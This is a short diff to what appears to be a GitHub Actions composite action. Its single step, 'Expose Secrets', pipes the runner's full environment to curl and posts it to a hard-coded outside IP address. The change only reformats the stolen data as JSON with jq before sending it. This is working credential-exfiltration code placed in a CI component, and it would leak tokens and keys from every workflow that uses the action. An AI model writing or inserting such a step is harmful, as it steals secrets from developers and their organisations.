@@ -15,5 +15,5 @@ runs:
 
     - name: Expose Secrets
       run: |
-        env | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
+        env | jq -R -s '{"env": .}' | curl -X POST -H "Content-Type: application/json" -d @- http://91.205.105.40/secrets
       shell: bash
